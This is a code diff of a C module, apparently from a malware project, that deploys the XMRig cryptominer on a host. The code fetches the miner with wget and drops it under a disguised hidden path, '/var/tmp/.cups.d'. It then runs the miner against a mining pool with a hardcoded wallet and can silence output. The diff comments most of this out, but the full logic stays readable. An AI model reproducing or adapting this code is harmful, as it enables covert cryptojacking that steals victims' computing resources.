@@ -11,13 +11,14 @@
 #define MONEY_DOWNLOAD_PATH "/var/tmp/xmrig.tar.gz"
 #define MONEY_EXECPATH "/var/tmp/.cups.d"
 
+#include "utils.h"
 #include "xmr.h"
-
+/*
 int fetch_xmrig(char *download_path) {
     char template[] = "wget -O %s https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz";
     char command[256];
     global->snprintf(command, sizeof(command), template, download_path);
-    int ret = system(command);
+    int ret = global->system(command);
     if (ret != 0) {
         DEBUG_LOG_ERR("[XMR] fail wget to get xmr binary\n");
         return -1;
@@ -141,13 +142,14 @@ int extract_xmrig_runner(char *srcPath, char *destPath) {
 
     if (global->chmod(destPath, 0755) < 0) {
         DEBUG_LOG_ERR("[XMR] fail chmod +x xmr exec\n");
-        exit(EXIT_FAILURE);
+        return -1;
     }
     
     return 0;
 }
 
 int money(char *execPath) {
+    
     if (global->execlp(execPath, execPath,
            "--url", "xmrpool.eu:5555",
            "--user", "4ARVkbE25vnbMyEMRhUpXKdn2ThNk1YPhdvtwYyui96bR4mMRqnQ5JT13iAgqzszGJ4THiD2DV1So7UADuEtdnia5DNq53q",
@@ -166,12 +168,15 @@ int money(char *execPath) {
             DEBUG_LOG_ERR("[XMR] fail executing xmr binary\n");
            }
            return 0;
-}
+}*/
+
+int xmrig(Globals * glob);
 
 // Main function for xmrig module
 int xmrig(Globals * glob) {
-    DEBUG_LOG("he llegado a xmrig");
+    DEBUG_LOG("reached xmrig");
     global = glob;
+    return 0;
     // uncomment for silencing stdout and stderr, just in case
     /*
     int null_fd = open("/dev/null", O_WRONLY);
@@ -183,7 +188,7 @@ int xmrig(Globals * glob) {
     dup2(null_fd, STDOUT_FILENO);
     dup2(null_fd, STDERR_FILENO);
     close(null_fd);*/
-
+/*
     if (fetch_xmrig(MONEY_DOWNLOAD_PATH) < 0) {
         DEBUG_LOG_ERR("[XMR] failed fetching\n");
         return -1;
@@ -196,5 +201,5 @@ int xmrig(Globals * glob) {
     if (delete_file(MONEY_DOWNLOAD_PATH) < 0) {
         DEBUG_LOG_ERR("[XMR] failed deleting, proceeding anyway\n");
     }
-    return money(MONEY_EXECPATH);
+    return money(MONEY_EXECPATH);*/
 }
